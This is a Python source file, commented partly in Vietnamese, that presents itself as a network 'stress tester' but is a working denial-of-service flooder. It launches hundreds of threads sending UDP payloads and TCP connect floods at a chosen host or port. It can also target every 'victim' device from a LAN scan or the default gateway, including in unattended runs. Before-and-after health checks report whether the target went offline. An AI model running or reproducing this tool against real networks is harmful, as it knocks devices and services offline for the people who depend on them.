import os, sys, time, socket, threading, re, json, subprocess, ipaddress
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn

os.environ["PYTHONIOENCODING"] = "utf-8"
os.environ["PYTHONUTF8"] = "1"
if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
    try: sys.stdout.reconfigure(encoding="utf-8")
    except Exception: pass

console = Console(force_terminal=True, color_system="truecolor", emoji=False)

try:
    mon_dir = os.path.dirname(os.path.abspath(__file__))
    if os.path.basename(mon_dir) != "monitoring":
        mon_dir = os.path.join(os.path.dirname(mon_dir), "monitoring")
    sys.path.insert(0, mon_dir)
    from reporter import report_event, report_finding
except Exception:
    def report_event(*a, **k): pass
    def report_finding(*a, **k): pass

# ─────────────────────────────────────────────────────────────────────
# TOPOLOGY LOADER — doc danh sach thiet bi tu net_scan
# ─────────────────────────────────────────────────────────────────────
def load_topology_targets():
    """Doc topology.json tra ve list dict {ip, hostname, mac, ports}"""
    try:
        mon_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "monitoring")
        topo_path = os.path.join(mon_dir, "topology.json")
        if not os.path.exists(topo_path):
            return []
        with open(topo_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        targets = []
        for node in data.get("nodes", []):
            if node.get("group") not in ("victim",):
                continue
            ip = _ensure_scope(node.get("ip", ""))
            if not ip:
                continue
            targets.append({
                "ip": ip,
                "hostname": node.get("hostname") or node.get("vendor") or f"Host-{ip.split('.')[-1]}",
                "mac": node.get("mac", ""),
                "ports": node.get("ports", "None"),
            })
        return targets
    except Exception:
        return []

def get_default_gateway():
    try:
        from scapy.all import conf
        return conf.route.route("0.0.0.0")[2]
    except Exception:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("10.255.255.255", 1))
            ip = s.getsockname()[0]
            s.close()
            parts = ip.split(".")
            return f"{parts[0]}.{parts[1]}.{parts[2]}.1"
        except Exception:
            return "192.168.1.1"

def _is_ipv6(ip):
    return ":" in str(ip)

def _sockaddr(ip, port):
    ip = str(ip)
    if "%" in ip:
        host, scope = ip.split("%", 1)
        try:
            return (host, int(port), 0, int(scope))
        except Exception:
            return (host, int(port), 0, 0)
    return (ip, int(port), 0, 0) if _is_ipv6(ip) else (ip, int(port))

def _ensure_scope(ip):
    """Them %ifindex cho link-local IPv6 neu thieu, de ping/connect hoat dong."""
    ip = str(ip).strip()
    if not _is_ipv6(ip) or "%" in ip:
        return ip
    try:
        if not ipaddress.ip_address(ip).is_link_local:
            return ip
    except Exception:
        return ip
    try:
        cmd = (f"Get-NetNeighbor -AddressFamily IPv6 -ErrorAction SilentlyContinue | "
               f"Where-Object {{ $_.IPAddress -eq '{ip}' -and $_.InterfaceIndex -gt 0 }} | "
               f"Select-Object -First 1 -ExpandProperty InterfaceIndex")
        out = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command", cmd],
            text=True, errors="ignore", timeout=3,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        ).strip()
        if out.isdigit() and int(out) > 0:
            return f"{ip}%{int(out)}"
    except Exception:
        pass
    return ip

# ─────────────────────────────────────────────────────────────────────
# L4 STRESS ENGINE
# ─────────────────────────────────────────────────────────────────────
class L4StressTester:
    def __init__(self, target_ip, target_port=80, threads=500, duration=30, mode="BOTH"):
        self.target_ip   = target_ip
        self.target_port = target_port
        self.threads     = threads
        self.duration    = duration
        self.mode        = mode.upper()
        self.running     = False
        self.total_packets = 0
        self.lock = threading.Lock()

    def _udp_flood_worker(self):
        # 1200-byte payload for realistic bandwidth saturation
        payload = os.urandom(1200)
        family = socket.AF_INET6 if _is_ipv6(self.target_ip) else socket.AF_INET
        sock = socket.socket(family, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        target = _sockaddr(self.target_ip, self.target_port)
        while self.running:
            try:
                sock.sendto(payload, target)
                with self.lock:
                    self.total_packets += 1
            except Exception:
                pass
        sock.close()

    def _syn_connect_worker(self):
        """Non-blocking TCP connect flood — satulates connection table without waiting"""
        family = socket.AF_INET6 if _is_ipv6(self.target_ip) else socket.AF_INET
        target = _sockaddr(self.target_ip, self.target_port)
        while self.running:
            try:
                s = socket.socket(family, socket.SOCK_STREAM)
                s.setblocking(False)
                try:
                    s.connect(target)
                except BlockingIOError:
                    pass
                except OSError:
                    pass
                with self.lock:
                    self.total_packets += 1
                s.close()
            except Exception:
                pass

    def start(self):
        self.running = True
        self.total_packets = 0
        worker_threads = []

        udp_count = 0
        syn_count = 0
        if self.mode == "UDP":
            udp_count = self.threads
        elif self.mode == "SYN":
            syn_count = self.threads
        else:  # BOTH — 60% UDP for bandwidth, 40% SYN for connection table
            udp_count = int(self.threads * 0.6)
            syn_count = self.threads - udp_count

        for _ in range(udp_count):
            t = threading.Thread(target=self._udp_flood_worker, daemon=True)
            worker_threads.append(t)
            t.start()

        for _ in range(syn_count):
            t = threading.Thread(target=self._syn_connect_worker, daemon=True)
            worker_threads.append(t)
            t.start()

        start_time = time.time()
        report_event(
            f"L4 Stress Test initiated on {self.target_ip}:{self.target_port} "
            f"[{self.mode}, {self.threads} threads, {self.duration}s]",
            event_type="warn", module="L4 Stress Tester", target=self.target_ip
        )

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            task = progress.add_task(
                f"[bold red]Transmitting L4 traffic ({self.mode})...[/bold red]",
                total=self.duration
            )
            last_log_sec = 0
            while time.time() - start_time < self.duration and self.running:
                time.sleep(0.25)
                elapsed = int(time.time() - start_time)
                pps = self.total_packets / max(elapsed, 1)
                progress.update(
                    task,
                    completed=min(elapsed, self.duration),
                    description=f"[bold red]Transmitting [{self.mode}] -> {self.target_ip}:{self.target_port} | {int(pps):,} pkt/s[/bold red]"
                )
                if elapsed - last_log_sec >= 3:
                    last_log_sec = elapsed
                    console.print(f"[bold red][*] [L4-STRESS] Đang gửi gói tin: {int(pps):,} pkt/s (Đã truyền: {self.total_packets:,} pkts, Còn: {max(0, self.duration - elapsed)}s)[/bold red]")

        self.running = False
        for t in worker_threads:
            t.join(timeout=0.1)

        report_event(
            f"L4 flood hoàn tất: {self.total_packets:,} gói trong {self.duration}s ({self.mode}) -> {self.target_ip}:{self.target_port}",
            event_type="succ",
            module="L4 Stress Tester",
            target=self.target_ip,
        )
        return self.total_packets

# ─────────────────────────────────────────────────────────────────────
# HEALTH CHECK
# ─────────────────────────────────────────────────────────────────────
def check_target_health(ip, port):
    import subprocess
    ip = _ensure_scope(ip)
    status = {"ping_ms": None, "port_open": False}
    try:
        ping_args = ["ping", "-6", "-n", "1", "-w", "1000", ip] if _is_ipv6(ip) else ["ping", "-n", "1", "-w", "1000", ip]
        res = subprocess.run(
            ping_args,
            capture_output=True, text=True, errors="ignore", check=False,
        )
        if res.returncode == 0:
            match = re.search(r"(?:time|thoi gian)[=<]\s*(\d+)ms", res.stdout, re.IGNORECASE)
            status["ping_ms"] = int(match.group(1)) if match else 0
    except Exception:
        pass
    try:
        family = socket.AF_INET6 if _is_ipv6(ip) else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(1.0)
        if s.connect_ex(_sockaddr(ip, port)) == 0:
            status["port_open"] = True
        s.close()
    except Exception:
        pass
    return status

# ─────────────────────────────────────────────────────────────────────
# PRINT RESULT SUMMARY
# ─────────────────────────────────────────────────────────────────────
def print_result(target_ip, port, mode, threads, duration, total, pre, post):
    pps_avg = int(total / max(duration, 1))
    console.print(f"\n[bold green]Test completed — {target_ip}:{port} [{mode}][/bold green]")
    console.print(f"   Total packets transmitted : [bold red]{total:,}[/bold red]")
    console.print(f"   Average throughput        : [bold yellow]{pps_avg:,}[/bold yellow] pkt/s")
    console.print(f"   Threads used              : {threads}")
    console.print(f"   Duration                  : {duration}s")

    pre_ping  = f"{pre['ping_ms']}ms"  if pre['ping_ms']  is not None else "N/A"
    post_ping = f"{post['ping_ms']}ms" if post['ping_ms'] is not None else "TIMEOUT"
    pre_port  = "OPEN"   if pre['port_open']  else "CLOSED"
    post_port = "OPEN"   if post['port_open'] else "CLOSED / UNRESPONSIVE"

    console.print("\n[bold cyan]Impact assessment:[/bold cyan]")
    console.print(f"   Ping  (before/after) : {pre_ping} -> {post_ping}")
    console.print(f"   Port {port} (before/after) : {pre_port} -> {post_port}")

    if post['ping_ms'] is None and pre['ping_ms'] is not None:
        console.print("[bold red]   -> Target became unreachable (ping timeout)[/bold red]")
    elif post['ping_ms'] is not None and pre['ping_ms'] is not None and post['ping_ms'] - pre['ping_ms'] > 100:
        console.print(f"[bold yellow]   -> Significant latency increase (+{post['ping_ms'] - pre['ping_ms']}ms)[/bold yellow]")
    else:
        console.print("[green]   -> Target remained responsive[/green]")

    if not post['port_open'] and pre['port_open']:
        console.print(f"[bold red]   -> Service on port {port} stopped responding[/bold red]")

# ─────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────
def run_test(target_ip, port, mode, threads, duration):
    target_ip = _ensure_scope(target_ip)
    console.print(f"\n[*] Target  : [bold yellow]{target_ip}:{port}[/bold yellow]")
    console.print(f"[*] Mode    : [bold cyan]{mode}[/bold cyan] | Threads: [bold cyan]{threads}[/bold cyan] | Duration: [bold cyan]{duration}s[/bold cyan]")
    with console.status("[cyan]Checking target health before test...[/cyan]", spinner="dots"):
        pre = check_target_health(target_ip, port)
    pre_ping_str = f"{pre['ping_ms']}ms" if pre['ping_ms'] is not None else "TIMEOUT / OFFLINE"
    pre_port_str = "OPEN" if pre['port_open'] else "CLOSED"
    console.print(f"[*] Initial status: Ping [bold green]{pre_ping_str}[/bold green] | Port {port}: [bold green]{pre_port_str}[/bold green]\n")

    tester = L4StressTester(target_ip, target_port=port, threads=threads, duration=duration, mode=mode)
    total = tester.start()

    with console.status("[cyan]Re-checking target health after test...[/cyan]", spinner="dots"):
        post = check_target_health(target_ip, port)

    print_result(target_ip, port, mode, threads, duration, total, pre, post)

def main():
    console.print(Panel.fit(
        "[bold red]L4 SYN / UDP STRESS TESTER[/bold red]\n"
        "[white]Network stress testing — measures device resilience under high packet load.[/white]",
        border_style="red"
    ))

    # Manager truyen args: target, port, mode
    # Neu khong co args (chay truc tiep) -> interactive
    if len(sys.argv) >= 2 and sys.argv[1] not in ("", "ALL", "all"):
        # Single target mode (called by manager with specific IP)
        target_ip = sys.argv[1].strip()
        port = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].strip().isdigit() else 80
        mode = sys.argv[3].upper() if len(sys.argv) > 3 else "BOTH"
        duration = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4].strip().isdigit() else 30
        threads  = int(sys.argv[5]) if len(sys.argv) > 5 and sys.argv[5].strip().isdigit() else 500
        run_test(target_ip, port, mode, threads, duration)

    elif len(sys.argv) >= 2 and sys.argv[1].upper() == "ALL":
        # ALL targets mode
        port = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].strip().isdigit() else 80
        mode = sys.argv[3].upper() if len(sys.argv) > 3 else "BOTH"
        duration = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4].strip().isdigit() else 30
        threads  = int(sys.argv[5]) if len(sys.argv) > 5 and sys.argv[5].strip().isdigit() else 500
        targets = load_topology_targets()
        if not targets:
            gateway = get_default_gateway()
            console.print(f"[yellow][!] Chưa có thiết bị quét từ LAN Scanner. Chuyển sang kiểm thử Gateway mặc định: {gateway}[/yellow]")
            targets = [{"ip": gateway, "hostname": "Default Gateway", "mac": "", "ports": "80"}]
        console.print(f"[bold red][*] ALL mode — testing {len(targets)} targets sequentially[/bold red]")
        for t in targets:
            console.rule(f"[bold red]{t['ip']} — {t['hostname']}[/bold red]")
            run_test(t["ip"], port, mode, threads, duration)
            time.sleep(1)

    else:
        # Interactive mode (chay truc tiep khong qua manager)
        targets = load_topology_targets()
        gateway = get_default_gateway()

        if not (sys.stdin and hasattr(sys.stdin, "isatty") and sys.stdin.isatty()):
            # Non-interactive fallback
            target_ip = gateway
            port = 80
            mode = "BOTH"
            duration = 30
            threads = 500
            console.print(f"[dim][*] Chế độ chạy nền non-interactive: Mục tiêu {target_ip}:80 (BOTH, 30s)[/dim]")
            run_test(target_ip, port, mode, threads, duration)
            return

        console.print(f"\n[bold cyan]Gateway detected: [yellow]{gateway}[/yellow][/bold cyan]")
        try:
            if targets:
                console.print("\n[bold cyan]Devices from last scan:[/bold cyan]")
                tbl = Table(box=None, show_header=False, padding=(0, 2))
                for i, t in enumerate(targets, 1):
                    console.print(f"  [[bold yellow]{i}[/bold yellow]] {t['ip']} - {t['hostname']} ({t['mac']})")

                choice = console.input("\n[cyan]Select target (number / IP, or Enter for ALL): [/cyan]").strip()
            else:
                console.print("[yellow][!] No topology data — run LAN Scanner first for device list.[/yellow]")
                choice = console.input(f"[cyan]Enter target IP (default: {gateway}): [/cyan]").strip()

            # Resolve choice
            all_mode = False
            selected_targets = []
            if not choice:
                all_mode = True
                selected_targets = targets if targets else [{"ip": gateway, "hostname": "Gateway"}]
            elif choice.isdigit() and targets and 1 <= int(choice) <= len(targets):
                selected_targets = [targets[int(choice) - 1]]
            else:
                selected_targets = [{"ip": choice, "hostname": choice}]

            port_in = console.input("[cyan]Target port (default: 80): [/cyan]").strip()
            port = int(port_in) if port_in.isdigit() else 80

            console.print("\n[bold yellow]Flood mode:[/bold yellow]")
            console.print("  [cyan][1][/cyan] BOTH — Combined SYN + UDP [bold green](default)[/bold green]")
            console.print("  [cyan][2][/cyan] UDP  — UDP bandwidth saturation")
            console.print("  [cyan][3][/cyan] SYN  — TCP connection table exhaustion")
            mode_in = console.input("[cyan]Select (1/2/3, default 1): [/cyan]").strip()
            mode = {"2": "UDP", "3": "SYN"}.get(mode_in, "BOTH")

            dur_in = console.input("[cyan]Duration in seconds (default: 30): [/cyan]").strip()
            duration = int(dur_in) if dur_in.isdigit() else 30

            thr_in = console.input("[cyan]Thread count (default: 500): [/cyan]").strip()
            threads = int(thr_in) if thr_in.isdigit() else 500
        except (EOFError, OSError):
            selected_targets = [{"ip": gateway, "hostname": "Gateway"}]
            port = 80
            mode = "BOTH"
            duration = 30
            threads = 500

        for t in selected_targets:
            if all_mode and len(selected_targets) > 1:
                console.rule(f"[bold red]{t['ip']} — {t['hostname']}[/bold red]")
            run_test(t["ip"], port, mode, threads, duration)
            if all_mode and t != selected_targets[-1]:
                time.sleep(1)

if __name__ == "__main__":
    main()
